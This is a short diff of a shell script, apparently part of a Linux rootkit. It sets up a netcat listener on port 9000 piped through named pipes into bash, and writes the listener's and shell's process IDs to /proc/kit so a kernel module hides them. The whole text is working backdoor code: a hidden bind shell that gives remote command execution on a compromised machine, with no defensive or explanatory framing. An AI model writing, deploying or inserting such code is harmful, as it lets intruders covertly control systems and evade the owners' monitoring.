@@ -8,11 +8,15 @@ localPort=9000
 #assumes module is install first
 
 
-mkfifo file
+mkfifo fromBash
+mkfifo toBash
 
-nc -l -k "$localPort" < file | bash >file & # uses named pipe
+nc -l -k "$localPort" < fromBash > toBash &
 backgroundPID=$!
+echo "hidePid $backgroundPID" > /proc/kit
 
+bash > fromBash < toBash & # uses named pipe
+backgroundPID=$!
 echo "hidePid $backgroundPID" > /proc/kit
 
 sleep 1
